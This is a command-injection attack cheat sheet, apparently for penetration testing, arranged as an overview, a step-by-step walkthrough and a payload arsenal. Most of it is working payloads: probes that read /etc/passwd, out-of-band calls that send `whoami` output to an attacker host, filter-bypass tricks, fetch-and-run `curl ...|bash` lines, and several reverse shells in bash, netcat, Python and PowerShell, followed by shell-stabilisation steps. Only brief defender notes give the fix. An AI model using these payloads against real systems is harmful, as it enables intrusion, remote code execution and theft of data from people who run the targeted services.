# Command Injection

Abuse an app that passes user input into a **system shell** command, so your input becomes
extra commands the server runs — code execution as the web user, usually a straight path to a
reverse shell. (Distinct from *code* injection: here you inject OS shell syntax.)

Replace placeholders (`<...>`) with your own values: `<your-ip>`, `<input>`, `<collab>`.

---
---

# PART 1 — OVERVIEW (at a glance)

## Shell metacharacters (your breakout)

| Char | Effect | Runs your cmd… |
|------|--------|----------------|
| `;` | command separator | after the first (Linux) |
| `\|` | pipe | with first's output as input |
| `\|\|` | OR | only if first fails |
| `&&` | AND | only if first succeeds |
| `&` | background / separator | alongside (Windows too) |
| `` `cmd` `` / `$(cmd)` | command substitution | inline, result embedded |
| `%0a` | newline | as a new line in the command |

## The workflow

1. **Find** — anywhere the app shells out (ping tools, converters, export, filename fields).
2. **Confirm in-band** — append `; id` / `& whoami`; look for command output.
3. **Blind?** confirm by **time** (`sleep 5`) or **OOB** (make the server call you).
4. **Bypass** space/keyword filters (`$IFS`, quoting, encoding).
5. **Shell** — pop a reverse shell, then stabilise and escalate.

## Go-to payloads

```bash
<input>; id                         # Linux, in-band
<input> & whoami                    # Windows, in-band
<input>; sleep 5                    # blind, time-based
<input>; curl http://<your-ip>/`whoami`   # blind, OOB
<input>; bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'   # reverse shell
```

## Defender notes (for the report)

- **Avoid the shell entirely** — use exec-array APIs (`execve`, `subprocess([...] , shell=False)`),
  never string concatenation into `system()`/`sh -c`.
- If a shell is unavoidable: strict allowlist, and pass user data as a single quoted argument.

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Find injectable inputs

Anywhere the app likely shells out: ping/traceroute/nslookup tools, file/image/PDF converters,
"export", filename fields, git/archive operations. Inject a metacharacter and watch for command
output or a timing change: `;  |  ||  &  &&  ` `` `cmd` `` `  $(cmd)  %0a`.

## Step 2 — Confirm (in-band first)

```bash
<input>; id
<input> | id
<input> && id
<input> $(id)
<input> `id`
```

```
what you see: uid=33(www-data) gid=33(www-data) groups=33(www-data)  ← execution!
```

Windows:

```
<input> & whoami        <input> | whoami        & ipconfig
```

## Step 3 — Blind confirmation (no output shown)

**Time-based** — the response hangs if the command runs:

```bash
<input>; sleep 5
<input> && ping -c 5 127.0.0.1
Windows:  & ping -n 5 127.0.0.1
```

**Out-of-band (OOB)** — make the server call you (best signal when nothing else shows):

```bash
<input>; curl http://<your-ip>/`whoami`
<input>; nslookup `whoami`.<collab>
# catch on: python3 -m http.server 80  /  interactsh  /  Burp Collaborator
```

## Step 4 — Filter / space / keyword bypasses

```bash
# no spaces:
cat</etc/passwd     {cat,/etc/passwd}     cat$IFS/etc/passwd     ${IFS}
# blocked chars: use $(...) if backticks filtered, or newline %0a
# keyword split / obfuscate:
w'h'oami     wh$@oami     c\at /etc/passwd     /???/??t /etc/passwd
# blacklist evade — base64 decode then run:
echo aWQ=|base64 -d|bash
# concatenation:
a=who;b=ami;$a$b
```

## Step 5 — Get a shell

```bash
# reverse shell (start a listener first: nc -lvnp 4444)
<input>; bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
<input>; busybox nc <your-ip> 4444 -e /bin/sh
# if only OOB works, stage it: download + run
<input>; curl http://<your-ip>/s.sh|bash
# Windows:
& powershell -e <base64-encoded reverse shell>
```

## Step 6 — Stabilise & escalate

```bash
# upgrade a dumb shell to a PTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z ; stty raw -echo ; fg ; export TERM=xterm
# then local enumeration + privesc (see linux-privesc / windows-privesc)
```

---
---

# PART 3 — PAYLOAD ARSENAL

## Quick payload menu

```bash
Linux:    ; id    | id    && id    $(id)    `id`    ; sleep 5    ; bash -c '...'
Windows:  & whoami   | whoami   && whoami   & ping -n 5 127.0.0.1
OOB:      ; curl http://<ip>/`whoami`    ; nslookup `whoami`.<collab>
```

## Filter-bypass reference

| Blocked | Bypass |
|---------|--------|
| space | `${IFS}` · `$IFS$9` · `{cat,/etc/passwd}` · `<` redirection · `%09` (tab) |
| keyword (`cat`) | `c\at` · `c''at` · `c"a"t` · `/???/??t` · `$@` insertion |
| `;` | `\|` · `&&` · `%0a` (newline) · `$(...)` · backticks |
| backticks | `$(...)` |
| everything | `echo <b64>\|base64 -d\|bash` |

## Reverse shells (listener: `nc -lvnp 4444`)

```bash
bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
busybox nc <your-ip> 4444 -e /bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 4444 >/tmp/f
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<your-ip>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# URL-encoded for a web param: >& → >%26  , space → %20  , & → %26
```

---

**Key idea:** command injection happens when input is concatenated into a shell command instead
of passed as a safe argument. A metacharacter (`; | & $() `` ` ``) ends the intended command and
starts yours, running as the web service account. Confirm with `id`/`whoami` (or timing/OOB when
blind), bypass filters with `$IFS` / quoting / encoding, then pop a reverse shell. The fix is to
avoid the shell entirely (exec-array APIs, never string concatenation).
